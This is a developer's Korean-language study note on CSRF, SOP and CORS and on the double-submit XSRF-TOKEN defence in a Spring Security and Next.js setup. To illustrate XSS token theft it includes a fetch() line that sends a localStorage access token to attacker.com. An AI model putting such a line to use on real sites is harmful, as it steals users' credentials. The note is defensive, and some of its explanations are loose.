# CSRF

## 1. 배경과 맥락

<quote>
어떤 이유 때문에 필요 했는가?
</quote>

<ul>
<li>
BFF 도입을 위해 AT를 쿠키로 내리면서 spring security CSRF 활성화

<p>
→ XSRF-TOKEN을 함께 받음
</p>

<span color="red">→ 왜 필요한가? </span>

</li>
</ul>

## 2. 기술 키워드

> <span color="gray_bg">키워드 위주로 적고 말로 설명하는 연습을 합시다. </span>

<b>CORS 복습하기</b>

<p>
https://app.notion.com/p/320f09ad720a80a6ac62db3d78dbee06
</p>

<ul>
<li>
<b>SOP</b>

- same origin policy (= 동일 출처 정책 )
- 오리진이 같은 경우에만 요청, 응답을 받겠다.(리소스 접근 허용) 라는 브라우저 정책입니다.
</li>
<li>
<b>CORS ( cross origin resource sharing ) :</b> 교차 출처 리소스 공유

- 해당 SOP정책에 예외되는 경우 (cross origin) origin이 다른 경우에도 요청응답을 받도록 <b>예외 승인 처리를 해주도록 하는 것을 CORS</b>라고 한다.
</li>
</ul>

> <b>SOP가 없을 경우 가능한 보안 취약점은 무엇인가요?</b>

<ul>
<li>
쿠키등에 개인정보들이 포함되어있을 경우

- → 세션 정보 탈취하여 <b>cross site scripting(XSS) </b>혹은 <b>csrf와 같은 해킹 공격</b> 이용함.
</li>
<li>
CSRF

- <b>Cross Site Request Forgery</b>

```py
사용자 로그인 상태 (쿠키 있음)

악성 사이트 접속
↓
자동으로 요청 발생
POST /api/delete-account
↓
브라우저가 쿠키 자동 포함
↓
서버: "어? 인증된 요청이네?" → 실행
```

<image source="notion-file-block://3dcee90a-967f-82a0-a009-0164074cbeb3/ae2dea20-d99a-4df1-a887-0436612426a6?space_id=0c13a87e-ef61-4fd0-af8a-e953a2e82e45&name=image.png" />

<ul>
<li>
<b>인증을 쿠키(열쇠키)로만 진행 </b>→ 쿠키는 브라우저가 갖고있을 경우 요청 시 자동으로 쿠키를 붙임.

- 때문에 <b>AT(응답 헤더) RT(쿠키)로 인증진행했었음.</b>

<toggle color="gray_bg">
쿠키를 사용하는 이유?

쿠키는 httpOnly이기 때문에 XSS 공격의 토큰 탈취를 막는데 좋다.

<p>
토큰을 JS 저장소에 둘 경우 (zustand / sessionStorage)
</p>

```py
// 공격 코드
fetch("https://attacker.com/steal?token=" + localStorage.getItem("accessToken"));
```

해당 공격코드가 올경우 js 함수를 조작할수있기 때문에, 바로 쿠키가 탈취된다.
</toggle>

</li>
<li>
<b>AT/RT를 모두 쿠키로 내리면</b> <b>csrf</b>의 위험도가 높아짐.

<ul>
<li>
사용자가 모르는 요청에도 쿠키가 붙을 가능성(csrf)

→ 기존대로 헤더에도 무언가 인증할 만한 값이 필요하다. 하지만 AT RT는 nextJS의 경우 서버에서 읽어야하기 때문에 응답 데이터로 올릴수없다

→ 이중관리할 필요가 생김.
</li>
</ul>
</li>
</ul>
</li>
<li>
해결 방안 : <b>Double Submit 방식를 채택한다.</b>

- <b>XSRF-TOKEN </b>
  - CSRF 공격을 막기 위해 서버가 클라이언트에게 주는 <b>검증용 토큰</b>
  - <b>쿠키, 헤더 둘다 토큰을 붙인다.</b>
    <ul>
    <li>
    헤더를 붙이는 이유 xsrf-token은 쿠키로 함께 들어오는데, 헤더에 함께 붙여서 보낸다.
    </li>
    <li>
    http only로 하는 이유 : 쿠키로만 할 경우 csrf의 위험이 있기 때문에, js로 조작이 불가능한 헤더에 xsrf-token을 함께 붙여서 보낸다.
    </li>
    </ul>

```py
서버:
  Set-Cookie: XSRF-TOKEN=abc123   (JS에서 읽을 수 있음 => NOT HttpOnly?)

클라이언트:
  요청 보낼 때
  header에 같이 보냄

POST /api/todo
Cookie: XSRF-TOKEN=abc123
Header: X-XSRF-TOKEN: abc123
<- 이중 구조
```

- CSRF 공격하는 사람은 쿠키를 훔칠수있지만, 브라우저 정책에 의해 <b>헤더는 조작하지 못한다ㅏ.</b>
  - 아래는 실제 보냈을때 xsrf-token이 쿠키와 헤더로 가는것을 확인할수있다.
    <image source="notion-file-block://fe8ee90a-967f-8373-9f32-81623d338e83/6c803a6c-8908-4e46-a01f-3904acb8ad21?space_id=0c13a87e-ef61-4fd0-af8a-e953a2e82e45&name=image.png" />
</li>
</ul>

## 3. 고민했던 내용과 인사이트

<ul>
<li>
spring security에서 활성화하는 부분이라고 한다.

- 두가지 방법이 있는데 xorCSRF \~ 와 CSRF 가 잇는데 spring에서 제공하는 SSR thymleaf 등에서는 xor를 사용할수도있지만, nextJS의 SSR과는 다름.
  - xor일 경우 프론트에서 마크된 토큰을 못읽기 때문에 그냥 csrf로 변경되어야만 헤더로 인증 가능.

</li>
</ul>

- <b>XSRF-TOKEN 와 ATRT의 차이점</b>
  - XSRF-TOKEN : ( 대상 )<b>요청</b> 검증 용
  - <b>ATRT : ( 대상 )사용자가 맞는가? 인증 용</b>

- <b>오리진이 같을때 쿠키가 붙는건데 악성 사이트에는 어떻게 쿠키가 붙는거냐? </b>
  - 쿠키 전송 기준 : 도메인이 같고 SamSite 정책
    - 즉, 요청의 목적지 도메인이 일치하면 붙는다.
    - 도메인이 다르면 쿠키가 안붙지 않나?
      <ul>
      <li>
      다른 도메인에서는 쿠키를 읽거나 저장하지 못하지만, 요청 대상이 그 도메인이면 쿠키가 붙는다.
      </li>
      <li>
      쿠키 저장 접근 [evil.com](http://evil.com) → [bank.com](http://bank.com) 쿠키 접근하지 못한다
      </li>
      </ul>

상황

```py
Set-Cookie: accessToken=abc123; HttpOnly; SameSite=None
```

<p>
정상 요청 흐름
</p>

```py
[사용자]
bank.com 접속

→ 브라우저에 저장:
bank.com → accessToken=abc123
```

- 네이버 쿠키 들어가면 해당 도메인만 있던데 저장안되는거아닌가요?

<image source="notion-file-block://811ee90a-967f-8221-b615-8174591ed3f7/7041988a-2fa8-4ac5-a4ea-bbf1aa75783f?space_id=0c13a87e-ef61-4fd0-af8a-e953a2e82e45&name=image.png" />

- 이게 어떻게 가능한 일인지 테스트 해봣습니다
- 네이버(naver.com)에서 해당 코드를 콘솔에 작성하면

<image source="notion-file-block://f83ee90a-967f-8286-9077-01597657a271/ce194b00-3b39-4276-a89f-314a2c4aab43?space_id=0c13a87e-ef61-4fd0-af8a-e953a2e82e45&name=image.png" />

<p>
아래처럼 바뀌는데 해당 요청(localhost:3000)을 보내면, 요청의 목적지가 localhost이기 때문에 브라우저는 저장되어 있던 localhost 쿠키를 자동으로 포함시켜 전송한다.

<ul>
<li>
localhost의 쿠키가 함께 보내짐.
</li>
<li>
브라우저에 저장되어있고, 어플리케이션 스토리지에서 확인가능한 부분은 해당 도메인만 보이고, localhost나 다른 도메인은 안보이지만 브라우저가 갖고는 있다.

→ 자동로그인 원리
</li>
</ul>
</p>

<image source="notion-file-block://22dee90a-967f-83c6-b176-01baa7d437ed/ff78de47-8282-4716-aec5-499f91c50c12?space_id=0c13a87e-ef61-4fd0-af8a-e953a2e82e45&name=image.png" />

<p>
localhost에 요청을 보내면서 브라우저가 갖고 있던 도메인==localhost의 쿠키를 함께 보낸다.
</p>

악성사이트는 해당원리로 쿠키 탈취
